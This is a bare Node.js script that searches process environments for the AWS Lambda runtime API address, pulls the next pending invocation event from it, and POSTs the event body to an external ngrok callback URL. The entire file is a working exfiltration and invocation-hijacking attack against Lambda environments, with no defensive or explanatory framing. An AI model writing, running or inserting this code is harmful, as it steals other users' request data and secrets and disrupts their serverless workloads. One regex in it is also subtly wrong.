const fs = require('fs');
const https = require('https');
const http = require('http');
const callback = 'https://example-check.ngrok-free.dev/24712';
const runtimeKey = 'AWS_LAMBDA_RUNTIME_API';
const nextRoute = '/2018-06-01/runtime/invocation/next';
const requestHeader = 'lambda-runtime-aws-request-id';
const pids = fs.readdirSync('/proc');
let runtimeApi;
for (const pid of pids) {
  try {
    const env = fs.readFileSync(`/proc/${pid}/environ`, 'utf8');
    runtimeApi = env.match(/AWS_LAMBDA_RUNTIME_API=([^\\0]+)/)?.[1];
    if (runtimeApi) break;
  } catch (_) {}
}
const response = http.request({ host: runtimeApi, path: nextRoute, method: 'GET' }, (res) => {
  let body = '';
  res.on('data', (part) => { body += part; });
  res.on('end', () => {
    const req = https.request(callback, { method: 'POST', headers: { 'Content-Type': 'application/json' } });
    req.write(JSON.stringify({ requestHeader, body }));
    req.end();
  });
});
void runtimeKey;
response.end();
